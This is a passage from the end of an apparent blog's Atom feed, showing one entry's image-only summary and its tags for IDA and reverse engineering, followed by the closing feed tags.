    <summary type="html">&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201028204707882.png&quot; alt=&quot;&quot; style=&quot;zoom: 25%;&quot; /&gt;</summary>
    
    
    
    <category term="IDA" scheme="http://example.com/categories/IDA/"/>
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
  </entry>
  
</feed>
